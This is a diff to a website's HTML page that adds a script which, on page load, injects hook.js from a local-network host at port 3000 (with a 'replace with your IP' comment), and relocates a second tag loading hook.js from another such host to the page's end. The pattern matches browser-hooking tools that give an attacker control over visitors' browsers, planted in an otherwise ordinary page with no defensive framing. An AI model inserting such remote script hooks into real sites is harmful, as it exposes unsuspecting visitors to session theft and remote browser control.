@@ -13,6 +13,31 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
 
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+  const host = 'http://192.168.1.100:3000'; // ← replace with your IP:port or hostname
+  const url  = `${host}/hook.js?v=${Date.now()}`; // cache-bust for dev
+
+  const imported = document.createElement('script');
+  imported.src = url;
+  imported.async = true;            // load async so it doesn't block
+  imported.defer = false;           // use defer if you want execution after parsing
+  imported.type = 'text/javascript';
+
+  imported.onload = () => {
+    console.log('hook.js loaded successfully from', url);
+    if (typeof initHook === 'function') { initHook(); } // optional init if hook exposes one
+  };
+
+  imported.onerror = (e) => {
+    console.error('Failed to load hook.js from', url, e);
+    // fallback behavior here if needed
+  };
+
+  document.head.appendChild(imported);
+});
+
+</script>
 
     <script>
         document.addEventListener("DOMContentLoaded", function() {
@@ -719,7 +744,6 @@ document.addEventListener("DOMContentLoaded", () => {
 
   els.forEach(el => io.observe(el));
 </script>
-<script src="http://192.168.137.130:3000/hook.js"></script>
 <script>
   const timeline = document.querySelector('.timeline');
 
@@ -734,7 +758,9 @@ document.addEventListener("DOMContentLoaded", () => {
   ioi.observe(timeline);
 </script>
 
+<script src="http://192.168.137.130:3000/hook.js"></script>
 
 
  </body>
+
  </html> 
